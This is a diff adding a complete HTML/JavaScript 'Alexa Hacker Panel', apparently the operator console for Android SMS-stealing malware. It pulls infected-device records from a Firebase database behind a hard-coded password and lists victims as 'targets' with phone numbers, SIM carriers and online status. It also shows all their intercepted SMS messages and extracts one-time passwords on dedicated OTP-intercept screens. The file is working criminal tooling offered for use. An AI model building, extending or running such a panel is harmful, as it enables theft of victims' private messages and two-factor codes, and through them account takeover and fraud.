@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>✦ Alexa Hacker Panel</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap');
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{font-family:'JetBrains Mono','Space Grotesk',monospace;background:#0a0a0a;color:#00ff41;overflow:hidden;height:100dvh;user-select:none}
+#matrix{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none;opacity:.06}
+.glow{position:fixed;top:-40%;left:-20%;width:140%;height:140%;z-index:0;pointer-events:none;background:radial-gradient(ellipse at 30% 40%,rgba(0,255,65,.02),transparent 60%),radial-gradient(ellipse at 70% 60%,rgba(0,100,0,.02),transparent 60%)}
+.scr{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;display:none;flex-direction:column}
+.scr.act{display:flex}
+#logScr{justify-content:center;align-items:center;background:rgba(5,5,5,.97)}
+.lbc{text-align:center;width:88%;max-width:380px;position:relative}
+.lbc::before{content:'';position:absolute;inset:-1px;border-radius:4px;background:linear-gradient(135deg,#00ff41,#003300,#00ff41);background-size:300% 300%;animation:grad 3s ease infinite;z-index:-1;opacity:.5}
+@keyframes grad{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+.lbc .ib{padding:40px 24px;border-radius:3px;background:rgba(5,5,5,.98);border:1px solid rgba(0,255,65,.1);position:relative}
+.lbc .ib::before{content:'[ SYSTEM v3.0 ]';position:absolute;top:8px;left:50%;transform:translateX(-50%);font-size:8px;color:rgba(0,255,65,.15);letter-spacing:3px;font-family:'JetBrains Mono',monospace}
+.lbc .logo{font-size:36px;margin-bottom:2px;display:block;filter:drop-shadow(0 0 15px rgba(0,255,65,.15))}
+.lbc h1{font-size:18px;font-weight:800;color:#00ff41;letter-spacing:-.5px;text-shadow:0 0 20px rgba(0,255,65,.1);font-family:'Space Grotesk',sans-serif}
+.lbc .s{color:rgba(0,255,65,.15);font-size:9px;margin:2px 0 28px;letter-spacing:4px;text-transform:uppercase}
+.lbc .fi{position:relative;margin-bottom:16px}
+.lbc .fi input{width:100%;padding:14px 16px;background:rgba(0,255,65,.02);border:1px solid rgba(0,255,65,.1);border-radius:2px;color:#00ff41;font-family:'JetBrains Mono',monospace;font-size:14px;outline:none;transition:.3s;padding-right:44px;letter-spacing:1px}
+.lbc .fi input:focus{border-color:#00ff41;box-shadow:0 0 25px rgba(0,255,65,.03);background:rgba(0,255,65,.03)}
+.lbc .fi input::placeholder{color:rgba(0,255,65,.08);letter-spacing:2px;font-size:10px}
+.lbc .fi .ico{position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:14px;opacity:.1;color:#00ff41}
+.lbc button{width:100%;padding:14px;background:rgba(0,255,65,.03);border:1px solid rgba(0,255,65,.15);border-radius:2px;color:#00ff41;font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:500;cursor:pointer;transition:.3s;letter-spacing:3px;text-transform:uppercase}
+.lbc button:hover{background:rgba(0,255,65,.06);border-color:rgba(0,255,65,.3);box-shadow:0 0 30px rgba(0,255,65,.02)}
+.lbc button:active{transform:scale(.98);background:rgba(0,255,65,.1)}
+.lbc .er{color:#ff0033;font-size:10px;margin-top:12px;display:none;letter-spacing:2px;text-shadow:0 0 10px rgba(255,0,51,.2)}
+.top{background:rgba(5,5,5,.9);backdrop-filter:blur(10px);padding:8px 14px;display:flex;align-items:center;gap:10px;border-bottom:1px solid rgba(0,255,65,.06);z-index:10;min-height:44px}
+.top .bck{font-size:16px;cursor:pointer;color:rgba(0,255,65,.25);background:rgba(0,255,65,.03);border:1px solid rgba(0,255,65,.06);border-radius:2px;padding:5px 10px;font-family:'JetBrains Mono',monospace;transition:.2s}
+.top .bck:active{background:rgba(0,255,65,.06);transform:scale(.95)}
+.top h2{flex:1;font-size:12px;font-weight:500;letter-spacing:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#00ff41;text-transform:uppercase}
+.top .bdg{font-size:8px;padding:3px 10px;border-radius:2px;border:1px solid rgba(0,255,65,.1);color:#00ff41;background:rgba(0,255,65,.04);white-space:nowrap;font-weight:500;flex-shrink:0;letter-spacing:2px;text-transform:uppercase}
+.cnt{flex:1;overflow-y:auto;padding:8px 12px;z-index:1;-webkit-overflow-scrolling:touch}
+.cnt::-webkit-scrollbar{width:2px}
+.cnt::-webkit-scrollbar-thumb{background:rgba(0,255,65,.1);border-radius:0}
+.srch{display:flex;gap:6px;margin-bottom:8px}
+.srch input{flex:1;padding:8px 12px;background:rgba(0,255,65,.02);border:1px solid rgba(0,255,65,.06);border-radius:2px;color:#00ff41;font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;transition:.3s}
+.srch input:focus{border-color:rgba(0,255,65,.2)}
+.srch input::placeholder{color:rgba(0,255,65,.06);letter-spacing:1px}
+.cd{background:rgba(0,255,65,.008);border:1px solid rgba(0,255,65,.04);border-radius:2px;padding:12px;margin-bottom:8px}
+.cd h3{font-size:9px;color:rgba(0,255,65,.2);font-weight:500;margin-bottom:8px;padding-bottom:4px;border-bottom:1px solid rgba(0,255,65,.03);letter-spacing:3px;text-transform:uppercase}
+.stg{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px}
+.stg .s{background:rgba(0,255,65,.008);border:1px solid rgba(0,255,65,.04);border-radius:2px;padding:12px 8px;text-align:center}
+.stg .s .v{font-size:22px;font-weight:700;color:#00ff41;text-shadow:0 0 15px rgba(0,255,65,.05);font-family:'JetBrains Mono',monospace}
+.stg .s .l{font-size:8px;color:rgba(0,255,65,.12);margin-top:2px;letter-spacing:2px;text-transform:uppercase}
+.qk{display:grid;grid-template-columns:repeat(4,1fr);gap:4px;margin-bottom:8px}
+.qk .b{background:rgba(0,255,65,.008);border:1px solid rgba(0,255,65,.04);border-radius:2px;padding:10px 4px;text-align:center;cursor:pointer;transition:.15s}
+.qk .b:active{background:rgba(0,255,65,.03);border-color:rgba(0,255,65,.1);transform:scale(.96)}
+.qk .b .ic{font-size:18px;display:block;margin-bottom:3px}
+.qk .b .l{font-size:7px;color:rgba(0,255,65,.12);letter-spacing:2px;font-weight:500;text-transform:uppercase}
+.dvc{display:flex;align-items:center;gap:8px;padding:8px 10px;background:rgba(0,255,65,.008);border:1px solid rgba(0,255,65,.04);border-radius:2px;margin-bottom:4px;cursor:pointer;transition:.15s}
+.dvc:active{background:rgba(0,255,65,.02);border-color:rgba(0,255,65,.08);transform:scale(.98)}
+.dvc .no{font-size:8px;color:rgba(0,255,65,.08);font-weight:500;min-width:20px;font-family:'JetBrains Mono',monospace}
+.dvc .av{width:28px;height:28px;border-radius:2px;background:rgba(0,255,65,.04);display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0;border:1px solid rgba(0,255,65,.04);color:#00ff41}
+.dvc .i{flex:1;min-width:0}
+.dvc .i .n{font-size:11px;font-weight:600;color:#00ff41;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dvc .i .n .id{font-size:8px;color:rgba(0,255,65,.15);font-weight:400}
+.dvc .i .p{font-size:9px;color:rgba(0,255,65,.1);margin-top:1px;letter-spacing:.5px}
+.dvc .i .m{font-size:8px;color:rgba(0,255,65,.08);margin-top:1px;display:flex;gap:6px;align-items:center}
+.dvc .i .m sp{display:flex;align-items:center;gap:2px}
+.stt{width:4px;height:4px;border-radius:0;display:inline-block}
+.stt.on{background:#00ff41;box-shadow:0 0 6px rgba(0,255,65,.6)}
+.stt.off{background:#ff0033;box-shadow:0 0 4px rgba(255,0,51,.3)}
+.smi{display:flex;gap:8px;padding:6px 0;border-bottom:1px solid rgba(0,255,65,.01)}
+.smi:last-child{border-bottom:none}
+.smi .ava{width:26px;height:26px;border-radius:2px;background:rgba(0,255,65,.03);display:flex;align-items:center;justify-content:center;font-size:10px;color:rgba(0,255,65,.3);flex-shrink:0}
+.smi .b{flex:1;min-width:0}
+.smi .b .sn{font-size:9px;color:rgba(0,255,65,.35);font-weight:500;letter-spacing:.5px}
+.smi .b .sm{font-size:10px;color:rgba(0,255,65,.18);margin:1px 0;word-break:break-word;line-height:1.4;font-family:'JetBrains Mono',monospace}
+.smi .b .st{font-size:7px;color:rgba(0,255,65,.06);display:flex;gap:6px;align-items:center}
+.oic{background:rgba(0,255,65,.008);border:1px solid rgba(0,255,65,.04);border-radius:2px;padding:8px;margin-bottom:4px}
+.oic .h{display:flex;justify-content:space-between;font-size:7px;color:rgba(0,255,65,.08);margin-bottom:2px;letter-spacing:.5px}
+.oic .oc{font-family:'JetBrains Mono',monospace;font-size:18px;font-weight:700;color:#00ff41;text-shadow:0 0 10px rgba(0,255,65,.1);letter-spacing:4px;margin-bottom:1px}
+.oic .od{font-size:8px;color:rgba(0,255,65,.12);word-break:break-all}
+.tbs{display:flex;gap:3px;margin-bottom:8px;overflow-x:auto;padding:2px 0}
+.tbs .t{padding:5px 12px;background:rgba(0,255,65,.008);border:1px solid rgba(0,255,65,.04);border-radius:2px;color:rgba(0,255,65,.15);font-family:'JetBrains Mono',monospace;font-size:9px;cursor:pointer;white-space:nowrap;letter-spacing:1px;transition:.2s;font-weight:500;text-transform:uppercase}
+.tbs .t.act{background:rgba(0,255,65,.04);border-color:rgba(0,255,65,.12);color:#00ff41}
+.hlin{background:rgba(0,255,65,.005);border:1px solid rgba(0,255,65,.04);border-radius:2px;padding:10px;font-size:10px;line-height:2;color:rgba(0,255,65,.12);font-family:'JetBrains Mono',monospace;word-break:break-all}
+.hlin span{color:rgba(0,255,65,.45)}
+.cp{cursor:pointer;border-bottom:1px dotted rgba(0,255,65,.08);transition:.2s}
+.cp:active{color:#00ff41;border-color:#00ff41}
+#toast{position:fixed;bottom:60px;left:50%;transform:translateX(-50%);background:rgba(5,5,5,.95);border:1px solid rgba(0,255,65,.08);color:#00ff41;padding:8px 16px;font-size:10px;z-index:99;opacity:0;transition:.35s;backdrop-filter:blur(8px);font-family:'JetBrains Mono',monospace;letter-spacing:2px;white-space:nowrap;max-width:88%;text-transform:uppercase}
+.adm-sel{display:flex;gap:4px;margin-bottom:8px;flex-wrap:wrap}
+.adm-sel .a{padding:4px 10px;background:rgba(0,255,65,.008);border:1px solid rgba(0,255,65,.04);border-radius:2px;color:rgba(0,255,65,.12);font-family:'JetBrains Mono',monospace;font-size:8px;cursor:pointer;white-space:nowrap;letter-spacing:1px;transition:.2s;font-weight:500;text-transform:uppercase}
+.adm-sel .a.act{background:rgba(0,255,65,.04);border-color:rgba(0,255,65,.12);color:#00ff41}
+.adm-sel .a:active{transform:scale(.96)}
+#scanline{position:fixed;top:0;left:0;width:100%;height:100%;z-index:2;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.03) 2px,rgba(0,0,0,.03) 4px)}
+@keyframes pl{0%,100%{opacity:.04}50%{opacity:.3}}
+@media(max-width:480px){.qk{grid-template-columns:repeat(2,1fr)}.stg{grid-template-columns:1fr 1fr}.top{padding:6px 10px;min-height:40px}.cnt{padding:6px 8px}.tbs{flex-wrap:wrap}.tbs .t{font-size:8px;padding:4px 8px}}
+</style>
+</head>
+<body>
+<div id="scanline"></div>
+<canvas id="matrix"></canvas>
+<div class="glow"></div>
+
+<div id="logScr" class="scr act">
+  <div class="lbc">
+    <div class="ib">
+      <span class="logo">💀</span>
+      <h1>ALEXA HACKER PANEL</h1>
+      <div class="s">// encrypted channel v3.0 //</div>
+      <div class="fi"><input type="password" id="loginPass" placeholder="> ENTER ACCESS KEY" autocomplete="off"><span class="ico">⏎</span></div>
+      <button onclick="doLogin()">> AUTHENTICATE</button>
+      <div class="er" id="loginErr">> ACCESS DENIED // DON'T TRY</div>
+    </div>
+  </div>
+</div>
+
+<div id="mainScr" class="scr">
+  <div class="top"><h2>💀 ALEXA // PANEL</h2><span class="bdg" id="liveBadge">● LIVE</span></div>
+  <div class="cnt">
+    <div class="srch"><input id="srchInp" placeholder="> SEARCH TARGETS..."></div>
+    <div class="stg" id="statCards"></div>
+    <div class="qk" id="quickBtns"></div>
+    <div class="adm-sel" id="adminSel"></div>
+    <div id="mainBody"></div>
+  </div>
+</div>
+
+<div id="detailScr" class="scr">
+  <div class="top"><button class="bck" onclick="closeDet()">←</button><h2 id="detTitle">TARGET</h2><span class="bdg" id="detBadge"></span></div>
+  <div class="cnt">
+    <div id="detInfo"></div>
+    <div class="tbs" id="detTabs"></div>
+    <div id="detBody"></div>
+  </div>
+</div>
+
+<div id="allSmsScr" class="scr">
+  <div class="top"><button class="bck" onclick="closeAllSms()">←</button><h2>ALL SMS // LOGS</h2><span class="bdg" id="allSmsCnt">0</span></div>
+  <div class="cnt">
+    <div class="srch"><input id="smsSrch" placeholder="> SEARCH IN LOGS..."></div>
+    <div id="allSmsBody"></div>
+  </div>
+</div>
+
+<div id="otpScr" class="scr">
+  <div class="top"><button class="bck" onclick="closeOtps()">←</button><h2>🔑 OTP // INTERCEPT</h2><span class="bdg" id="otpCnt">0</span></div>
+  <div class="cnt"><div id="otpBody"></div></div>
+</div>
+
+<div id="toast"></div>
+
+<script>
+const DB='https://fortydata-fee65-default-rtdb.firebaseio.com';
+const ADMINS=['FALCON','FALCON01','FALCON02','FALCON03'];
+const PW='Alexa';
+let curAdmin='FALCON01';
+let usersData={}, smsList=[], devices=[];
+let srchQ='', smsSrchQ='', curDid='', curDev=null, detTab='info';
+let showOnline=0;
+let deTimer, pollTimer;
+let isLoggedIn=false;
+
+function speak(t){
+  try{
+    if(!window.speechSynthesis)return;
+    window.speechSynthesis.cancel();
+    window.speechSynthesis.getVoices();
+    const u=new SpeechSynthesisUtterance(t);
+    u.lang='en-US';
+    u.rate=0.85;
+    u.volume=1;
+    window.speechSynthesis.speak(u);
+  }catch(e){}
+}
+
+async function fbGet(path){try{const r=await fetch(DB+'/'+path+'.json');return await r.json()}catch(e){return null}}
+
+function showToast(m){
+  const t=document.getElementById('toast');t.textContent='> '+m.toUpperCase();t.style.opacity='1';
+  clearTimeout(t._h);t._h=setTimeout(()=>t.style.opacity='0',3000);
+}
+
+function copyT(t){
+  const ta=document.createElement('textarea');ta.value=t;ta.style.position='fixed';ta.style.opacity='0';
+  document.body.appendChild(ta);ta.select();try{document.execCommand('copy');showToast('Copied')}catch(e){}document.body.removeChild(ta);
+}
+
+function doLogin(){
+  const p=document.getElementById('loginPass').value.trim();
+  if(p!==PW){
+    document.getElementById('loginErr').style.display='block';
+    speak("don't try");
+    return
+  }
+  document.getElementById('logScr').classList.remove('act');
+  document.getElementById('mainScr').classList.add('act');
+  isLoggedIn=true;
+  speak('Welcome To Alexa Hacker Panel');
+  document.getElementById('mainBody').innerHTML='<div style="padding:40px;text-align:center"><div style="font-size:24px;margin-bottom:12px;opacity:.3">⏳</div><div style="font-size:10px;color:rgba(0,255,65,.08);letter-spacing:3px">// ESTABLISHING CONNECTION</div><div style="margin-top:16px;font-size:8px;color:rgba(0,255,65,.04);letter-spacing:2px;animation:pl 1.5s infinite">_</div></div>';
+  setTimeout(()=>loadData(curAdmin),100);
+}
+
+async function loadData(admin){
+  const d=await fbGet('admin/'+admin+'/users')||{};
+  if(admin!==curAdmin)return;
+  usersData=d;
+  smsList=[];
+  devices=[];
+  Object.keys(d).forEach(id=>{
+    const u=d[id];
+    if(!u||!u.deviceInfo)return;
+    const sms=u.receivedSms||{};
+    const msgs=Object.keys(sms).map(k=>{const s=sms[k];return{...s,smsId:k,did:id,model:u.deviceInfo.model||'',brand:u.deviceInfo.brand||'',name:id.slice(0,8)}});
+    smsList.push(...msgs);
+    devices.push({did:id,info:u.deviceInfo,sim:u.simInfo||null,heartbeat:u.heartbeat,smsCount:Object.keys(sms).length});
+  });
+  smsList.sort((a,b)=>((b.timestamp||0)-(a.timestamp||0)));
+  clearInterval(pollTimer);
+  pollTimer=setInterval(()=>loadData(curAdmin),8000);
+  dbUpdate();
+}
+
+function dbUpdate(){clearTimeout(deTimer);deTimer=setTimeout(renderUI,300)}
+
+function switchAdmin(admin){
+  if(admin===curAdmin&&usersData&&Object.keys(usersData).length)return;
+  curAdmin=admin;
+  document.querySelectorAll('.adm-sel .a').forEach(el=>el.classList.toggle('act',el.dataset.admin===admin));
+  document.getElementById('mainBody').innerHTML='<div style="padding:30px;text-align:center;font-size:9px;color:rgba(0,255,65,.06);letter-spacing:2px">// SWITCHING TO '+admin+'...</div>';
+  loadData(admin);
+}
+
+function isOnline(did){
+  const u=usersData[did];
+  if(!u||!u.heartbeat)return false;
+  return Date.now()-u.heartbeat<300000;
+}
+
+function getModel(did){
+  const u=usersData[did];
+  return u?.deviceInfo?.model||'UNKNOWN';
+}
+
+function getPhone(did){
+  const u=usersData[did];
+  if(!u||!u.simInfo)return'';
+  const si=u.simInfo;
+  if(typeof si==='string')return si;
+  if(typeof si==='object'){
+    for(const k in si){
+      const v=si[k];
+      if(v&&typeof v==='object'&&v.number&&v.number.length>=10)return v.number;
+      if(typeof v==='string'&&v.length>=10&&v.replace(/[^0-9]/g,'').length>=10)return v.replace(/[^0-9]/g,'');
+    }
+  }
+  return'';
+}
+
+function getSims(did){
+  const u=usersData[did];
+  if(!u||!u.simInfo||typeof u.simInfo!=='object')return[];
+  const arr=[];
+  for(const k in u.simInfo){
+    const v=u.simInfo[k];
+    if(v&&typeof v==='object')arr.push({slot:k,carrier:v.carrierName||'',number:v.number||'',slotIndex:v.slotIndex});
+  }
+  return arr;
+}
+
+function showScr(id){
+  document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
+  document.getElementById(id).classList.add('act');
+}
+
+function renderUI(){
+  if(!isLoggedIn)return;
+  const scr=document.querySelector('.scr.act');
+  if(!scr)return;
+  const id=scr.id;
+  if(id==='mainScr')renderDash();
+  else if(id==='detailScr'&&curDid)renderDet();
+  else if(id==='allSmsScr')renderAllSms();
+  else if(id==='otpScr')renderOtps();
+}
+
+function renderDash(){
+  const online=devices.filter(d=>isOnline(d.did)).length;
+  const totalSms=smsList.length;
+  const otpCount=smsList.filter(s=>(s.message||'').toUpperCase().includes('OTP')).length;
+  document.getElementById('statCards').innerHTML=`
+    <div class="s"><div class="v">${String(devices.length).padStart(3,'0')}</div><div class="l">// TARGETS</div></div>
+    <div class="s"><div class="v">${String(totalSms).padStart(4,'0')}</div><div class="l">// LOGS</div></div>
+    <div class="s"><div class="v">${String(online).padStart(3,'0')}</div><div class="l">// ACTIVE</div></div>
+    <div class="s"><div class="v">${String(otpCount).padStart(3,'0')}</div><div class="l">// OTP</div></div>`;
+  document.getElementById('quickBtns').innerHTML=`
+    <div class="b" onclick="showScr('mainScr');renderDash()"><span class="ic">🎯</span><span class="l">Targets</span></div>
+    <div class="b" onclick="showOtps()"><span class="ic">🔑</span><span class="l">OTPs</span></div>
+    <div class="b" onclick="showScr('allSmsScr');renderAllSms()"><span class="ic">📨</span><span class="l">Logs</span></div>
+    <div class="b" onclick="showScr('mainScr')"><span class="ic">🔄</span><span class="l">Refresh</span></div>`;
+  document.getElementById('adminSel').innerHTML=ADMINS.map(a=>`<div class="a ${a===curAdmin?'act':''}" data-admin="${a}" onclick="switchAdmin('${a}')">[${a}]</div>`).join('');
+
+  const q=srchQ.toLowerCase();
+  const filtered=q?devices.filter(d=>d.did.toLowerCase().includes(q)||getModel(d.did).toLowerCase().includes(q)||d.info?.brand?.toLowerCase().includes(q)||getPhone(d.did).toLowerCase().includes(q)):devices;
+  const onlineDevices=filtered.filter(d=>isOnline(d.did));
+  const offlineDevices=filtered.filter(d=>!isOnline(d.did));
+  document.getElementById('mainBody').innerHTML=`
+    <div class="tbs" style="margin-bottom:6px">
+      <div class="t ${showOnline===0?'act':''}" onclick="showOnline=0;renderDash()">[ALL // ${devices.length}]</div>
+      <div class="t ${showOnline===1?'act':''}" onclick="showOnline=1;renderDash()">[● ONLINE // ${onlineDevices.length}]</div>
+      <div class="t ${showOnline===2?'act':''}" onclick="showOnline=2;renderDash()">[○ OFFLINE // ${offlineDevices.length}]</div>
+    </div>
+    ${(showOnline===1?onlineDevices:showOnline===2?offlineDevices:filtered).map((d,i)=>`
+      <div class="dvc" onclick="openDet('${d.did}')">
+        <span class="no">#${i+1}</span>
+        <div class="av">${(getModel(d.did)[0]||'?').toUpperCase()}</div>
+        <div class="i">
+          <div class="n">${getModel(d.did)} <span class="stt ${isOnline(d.did)?'on':'off'}"></span></div>
+          <div class="p">${getPhone(d.did)?'📞 '+getPhone(d.did):d.info?.brand||d.did.slice(0,8)} <span class="id">${d.did.slice(0,8)}</span></div>
+          <div class="m"><sp>📨 ${d.smsCount}</sp><sp>${d.info?.version?'v'+d.info.version:''}</sp><sp>${isOnline(d.did)?'● ONLINE':'○ OFFLINE'}</sp>${getSims(d.did).length?('<sp>📡 '+getSims(d.did).map(s=>s.carrier||'').filter(Boolean).join('/')+'</sp>'):''}</div>
+        </div>
+      </div>`).join('')}
+    ${!filtered.length?'<div style="padding:30px;text-align:center;color:rgba(0,255,65,.04);font-size:10px;letter-spacing:2px">'+(q?'// NO MATCH IN DATABASE':'// NO TARGETS FOUND')+'</div>':''}
+  </div>`;
+}
+
+document.getElementById('srchInp').addEventListener('input',function(){srchQ=this.value;renderDash()});
+document.getElementById('smsSrch')?.addEventListener('input',function(){smsSrchQ=this.value;renderAllSms()});
+
+function openDet(did){
+  curDid=did;
+  detTab='info';
+  renderDet();
+  showScr('detailScr');
+}
+
+function renderDet(){
+  const u=usersData[curDid];
+  if(!u){showToast('// NO DATA');return}
+  curDev=u;
+  const ol=isOnline(curDid);
+  document.getElementById('detTitle').textContent='> TARGET // '+getModel(curDid).toUpperCase();
+  document.getElementById('detBadge').textContent=ol?'● ONLINE':'○ OFFLINE';
+  const info=u.deviceInfo||{};
+  const sms=u.receivedSms||{};
+  const msgs=Object.keys(sms).map(k=>({...sms[k],smsId:k}));
+  msgs.sort((a,b)=>((b.timestamp||0)-(a.timestamp||0)));
+
+  document.getElementById('detInfo').innerHTML=`
+    <div class="cd"><h3>// TARGET PROFILE</h3>
+      <div class="hlin">
+        <div>UID  : <span>${curDid}</span></div>
+        <div>BRND : <span>${info.brand||'-'}</span></div>
+        <div>MFR  : <span>${info.manufacturer||'-'}</span></div>
+        <div>MOD  : <span>${info.model||'-'}</span></div>
+        <div>AND  : <span>${info.version||'-'}</span></div>
+        <div>PHN  : <span class="cp" onclick="copyT('${getPhone(curDid)}')">${getPhone(curDid)||'-'}</span></div>
+        <div>STAT : <span style="color:${ol?'#00ff41':'#ff0033'}">${ol?'ONLINE':'OFFLINE'}</span></div>
+        ${u.heartbeat?`<div>LHB  : <span>${new Date(u.heartbeat).toLocaleString()}</span></div>`:''}
+        ${u.userCreated?`<div>CRE8 : <span>${new Date(u.userCreated).toLocaleString()}</span></div>`:''}
+      </div></div>`;
+  document.getElementById('detTabs').innerHTML=`
+    <div class="t ${detTab==='info'?'act':''}" onclick="swDet('info')">[INFO]</div>
+    <div class="t ${detTab==='sms'?'act':''}" onclick="swDet('sms')">[SMS // ${msgs.length}]</div>
+    <div class="t ${detTab==='otp'?'act':''}" onclick="swDet('otp')">[OTP]</div>`;
+  document.getElementById('detBody').innerHTML='';
+
+  if(detTab==='info'){
+    let h='<div class="cd"><h3>// FULL TARGET DATA</h3><div class="hlin">';
+    Object.keys(info).forEach(k=>{h+=`<div>${k.toUpperCase()}: <span>${info[k]}</span></div>`});
+    const sims=getSims(curDid);
+    sims.forEach(s=>{h+=`<div>SIM[${s.slotIndex??'?'}] : <span>${s.carrier} | ${s.number&&s.number.length>=10?('<span class=\"cp\" onclick=\"copyT(\''+s.number+'\')\">'+s.number+'</span>'):'N/A'}</span></div>`});
+    if(u.simInfo&&!sims.length){h+=`<div>SIM  : <span>${JSON.stringify(u.simInfo).slice(0,100)}</span></div>`}
+    h+=`<div>SMS  : <span>${msgs.length} messages</span></div>`;
+    h+='</div></div>';
+    document.getElementById('detBody').innerHTML=h;
+  }else if(detTab==='otp'){
+    const otps=msgs.filter(s=>(s.message||'').toUpperCase().includes('OTP'));
+    document.getElementById('detBody').innerHTML=`<div class="cd"><h3>// OTP INTERCEPT [${otps.length}]</h3>
+      ${otps.map(s=>`<div class="oic"><div class="h"><span>${s.sender||'?'}</span><span>${s.timestamp?new Date(s.timestamp).toLocaleString():''}</span></div><div class="oc">${(s.message||'').replace(/[^0-9]/g,'').slice(0,8)}</div><div class="od">${(s.message||'').slice(0,120)}</div></div>`).join('')||'<div style="padding:20px;text-align:center;color:rgba(0,255,65,.04);letter-spacing:2px">// NO OTP LOGS</div>'}
+    </div>`;
+  }else{
+    document.getElementById('detBody').innerHTML=`<div class="cd"><h3>// SMS LOGS [${msgs.length}]</h3>
+      ${msgs.map(s=>`<div class="smi"><div class="ava">${(s.sender||'?')[0]}</div><div class="b"><div class="sn">${s.sender||'?'}</div><div class="sm">${s.message||''}</div><div class="st">${s.timestamp?new Date(s.timestamp).toLocaleString():''}</div></div></div>`).join('')||'<div style="padding:20px;text-align:center;color:rgba(0,255,65,.04);letter-spacing:2px">// NO SMS LOGS</div>'}
+    </div>`;
+  }
+}
+
+function swDet(t){
+  detTab=t;
+  renderDet();
+}
+
+function showOtps(){
+  showScr('otpScr');
+  renderOtps();
+}
+
+function renderOtps(){
+  const otps=smsList.filter(s=>(s.message||'').toUpperCase().includes('OTP'));
+  document.getElementById('otpCnt').textContent=String(otps.length).padStart(3,'0');
+  document.getElementById('otpBody').innerHTML=`
+    <div class="cd"><h3>// OTP INTERCEPT [${otps.length}]</h3>
+      ${otps.map(s=>`<div class="oic"><div class="h"><span>${s.sender||'?'}</span><span>${s.timestamp?new Date(s.timestamp).toLocaleString():''}</span><span style="font-size:6px;color:rgba(0,255,65,.06)">${s.model||s.did?.slice(0,8)}</span></div><div class="oc">${(s.message||'').replace(/[^0-9]/g,'').slice(0,8)}</div><div class="od">${(s.message||'').slice(0,120)}</div></div>`).join('')||'<div style="padding:30px;text-align:center;color:rgba(0,255,65,.04);letter-spacing:2px">// NO OTP LOGS</div>'}
+    </div>`;
+}
+
+function renderAllSms(){
+  const q=smsSrchQ.toLowerCase();
+  const filtered=q?smsList.filter(s=>(s.message||'').toLowerCase().includes(q)||(s.sender||'').toLowerCase().includes(q)):smsList;
+  document.getElementById('allSmsCnt').textContent=String(smsList.length).padStart(4,'0');
+  document.getElementById('allSmsBody').innerHTML=`
+    <div class="cd"><h3>// ALL LOGS [${filtered.length}/${smsList.length}]</h3>
+      ${filtered.slice(0,200).map(s=>`<div class="smi" onclick="openDet('${s.did}')"><div class="ava">${(s.sender||'?')[0]}</div><div class="b"><div class="sn">${s.sender||'?'} <span style="font-size:6px;color:rgba(0,255,65,.06)">via ${s.model||s.did?.slice(0,8)}</span></div><div class="sm">${s.message||''}</div><div class="st">${s.timestamp?new Date(s.timestamp).toLocaleString():''}</div></div></div>`).join('')||'<div style="padding:30px;text-align:center;color:rgba(0,255,65,.04);font-size:10px;letter-spacing:2px">'+(q?'// NO MATCH':'// NO LOGS')+'</div>'}
+      ${filtered.length>200?'<div style="text-align:center;padding:8px;color:rgba(0,255,65,.04);font-size:8px;letter-spacing:2px">// SHOWING 200 OF '+filtered.length+'</div>':''}
+    </div>`;
+}
+
+window.closeDet=()=>{curDid='';showScr('mainScr');renderDash()};
+window.closeAllSms=()=>{showScr('mainScr');renderDash()};
+window.closeOtps=()=>{showScr('mainScr');renderDash()};
+
+document.getElementById('loginPass').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin()});
+
+// MATRIX RAIN
+(function(){
+  const c=document.getElementById('matrix'),ctx=c.getContext('2d');
+  let cols, drops=[];
+  function resize(){c.width=window.innerWidth;c.height=window.innerHeight;cols=Math.floor(c.width/14);drops=Array(cols).fill(1)}
+  resize();
+  window.addEventListener('resize',resize);
+  const chars='アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF';
+  function draw(){
+    ctx.fillStyle='rgba(10,10,10,.05)';
+    ctx.fillRect(0,0,c.width,c.height);
+    ctx.fillStyle='#00ff41';
+    ctx.font='12px monospace';
+    for(let i=0;i<drops.length;i++){
+      const ch=chars[Math.floor(Math.random()*chars.length)];
+      ctx.fillStyle=`rgba(0,255,65,${.04+Math.random()*.03})`;
+      ctx.fillText(ch,i*14,drops[i]*14);
+      if(drops[i]*14>c.height&&Math.random()>.975)drops[i]=0;
+      drops[i]++;
+    }
+  }
+  setInterval(draw,50);
+})();
+
+</script>
+</body>
+</html>
